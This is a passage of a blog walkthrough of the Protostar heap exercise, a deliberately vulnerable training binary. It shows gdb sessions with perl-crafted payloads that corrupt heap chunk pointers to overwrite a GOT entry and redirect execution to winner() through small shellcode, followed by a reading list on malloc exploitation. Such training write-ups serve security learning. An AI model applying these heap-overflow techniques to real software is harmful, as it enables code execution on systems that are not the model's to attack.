<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) r $(perl -e &#39;print &#34;\xCC&#34;x32&#39;) $(perl -e &#39;print &#34;B&#34;x32 .&#34;\xfc\xff\xff\xff&#34; .&#34;\xf0&#34;&#39;) $(perl -e &#39;print &#34;CCCC&#34; .&#34;\x1c\xb1\x04\x08&#34; .&#34;\x08\xc0\x04\x08&#34;&#39;)

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000000  EBX: 0xB7FD7FF4  ECX: 0x00000000  EDX: 0x00000000  o d I t s Z a P c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF5F8  ESP: 0xBFFFF5B0  EIP: 0x08049951
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
0x8049951 &lt;free+301&gt;:	mov    DWORD PTR [eax+0xc],edx
0x8049954 &lt;free+304&gt;:	mov    eax,DWORD PTR [ebp-0x18]
0x8049957 &lt;free+307&gt;:	mov    edx,DWORD PTR [ebp-0x14]
0x804995a &lt;free+310&gt;:	mov    DWORD PTR [eax+0x8],edx
0x804995d &lt;free+313&gt;:	mov    eax,DWORD PTR [ebp-0x24]
0x8049960 &lt;free+316&gt;:	add    DWORD PTR [ebp-0x30],eax
0x8049963 &lt;free+319&gt;:	mov    eax,DWORD PTR [ebp-0x38]
0x8049966 &lt;free+322&gt;:	add    eax,0x34
--------------------------------------------------------------------------------
gdb$ x/x 0x0804b128
0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:	0x0804c008
gdb$ x/12x 0x0804c008-8
0x804c000:	0x00000000	0x00000029	0xcccccccc	0xcccccccc
0x804c010:	0x0804b11c	0xcccccccc	0xcccccccc	0xcccccccc
0x804c020:	0xcccccccc	0xcccccccc	0x00000000	0x00000029</code></pre></div>

<p>So, the fd-pointer is written.
We run into a problem when the third chunk is free()d.</p>

<p>The code branch of free+301 is responsible to keep the pointers in place.
In particular, the pointers of next_next chunk are checked</p>

<p>Now we need to fix fd, the pointer to the next chunk.</p>

<!-- FIXME: How do we solve this. next chunk, nextnext chunk //-->

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) r $(perl -e &#39;print &#34;\xCC&#34;x32&#39;) $(perl -e &#39;print &#34;B&#34;x16 .&#34;\x01&#34;x4 .&#34;\xff&#34;x4 .&#34;B&#34;x8 .&#34;\xfc\xff\xff\xff&#34; .&#34;\xf0\xff\xff\xff&#34;&#39;) $(perl -e &#39;print &#34;CCCC&#34; .&#34;\x1c\xb1\x04\x08&#34; .&#34;\x08\xc0\x04\x08&#34;&#39;)
(gdb) x/12x 0x0804c008-8
0x804c000:      0x00000000      0x00000029      0xcccccccc      0xcccccccc
0x804c010:      0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x804c020:      0xcccccccc      0xcccccccc      0x00000000      0x00000029
(gdb) x/12x 0x0804c030-8
0x804c028:      0x00000000      0x00000029      0x42424242      0x42424242
0x804c038:      0x42424242      0x42424242      0x01010101      0xffffffff
0x804c048:      0x42424242      0x42424242      0xfffffffc      0xfffffff0
(gdb) x/12x 0x0804c058-8
0x804c050:      0xfffffffc      0xfffffff0      0x43434343      0x0804b11c
0x804c060:      0x0804c008      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89</code></pre></div>

<h2 id="exploitation">Exploitation</h2>

<p>Now the heap is ready and execution stops at 0x804c008.
Let&rsquo;s adjust our code to execute winner().</p>

<p>We need to jump over the invalid bytes at 0x0804c010.
A short jump \xeb get&rsquo;s us where we want.
Then, we can push our destination address and finally return to finish this exercise.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) r $(perl -e &#39;print &#34;AAAA&#34; .&#34;\xeb\x06&#34; .&#34;\x90&#34;x6 .&#34;\x68&#34; .&#34;\x64\x88\x04\x08&#34; .&#34;\xc3&#34;&#39;) $(perl -e &#39;print &#34;B&#34;x16 .&#34;\x01&#34;x4 .&#34;\xff&#34;x4 .&#34;B&#34;x8 .&#34;\xfc\xff\xff\xff&#34; .&#34;\xf0\xff\xff\xff&#34;&#39;) $(perl -e &#39;print &#34;CCCC&#34; .&#34;\x1c\xb1\x04\x08&#34; .&#34;\x08\xc0\x04\x08&#34;&#39;)
that wasn&#39;t too bad now, was it? @ 1414895218

Program exited with code 056.</code></pre></div>

<h1 id="links-and-references">Links and References</h1>

<h2 id="exploit-exercises">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-heap/">TheSprawl - protostar - heap levels</a></li>
</ul>

<h2 id="heap-exploitation">Heap Exploitation</h2>

<ul>
<li><a href="http://www.phrack.org/issues/57/8.html#article">Phrack 0x39, Phile #0x08 - Vudo malloc tricks</a></li>
<li><a href="http://www.phrack.org/issues/57/9.html#article">Phrack 0x39, Phile #0x09 - Once upon a free()</a></li>
<li><a href="http://phrack.org/issues/61/6.html#article">Advanced Doug lea&rsquo;s malloc exploits</a></li>
<li><a href="http://www.cgsecurity.org/exploit/heaptut.txt">w00w00 on Heap Overflows</a></li>
<li><a href="https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf">Understanding the heap by breaking it</a></li>
</ul>

<h2 id="other">Other</h2>

<ul>
<li><a href="http://gee.cs.oswego.edu/dl/html/malloc.html">Doug Lea&rsquo;s Malloc</a></li>
</ul>

    </div>
  </div>

  <ul class="pager">
    

    
      
        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Final-levels/"> Exploit Exercises - Protostar - Final levels</a></li>
      
    
    
      
        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/09/Exploit-Exercises---Protostar---Network-levels/"> Exploit Exercises - Protostar - Network levels</a></li>
      
    
  </ul>



<footer>

  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>

  
  

  <script type="text/javascript" src="http://camelinc.info//js/jquery-2.1.4.js"></script>

  <script src="http://camelinc.info//js/bootstrap.min.js"></script>
  <script src="http://camelinc.info//js/bootstrap.js"></script>
  <script type="text/javascript" src="http://camelinc.info//js/hc.js"></script>

  
  <script type="text/javascript" src="http://camelinc.info//lightbox/js/lightbox.js"></script>
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', "UA-83225898-1", 'auto');
    ga('send', 'pageview');
  </script>
  

  

</footer>

	</body>
</html>
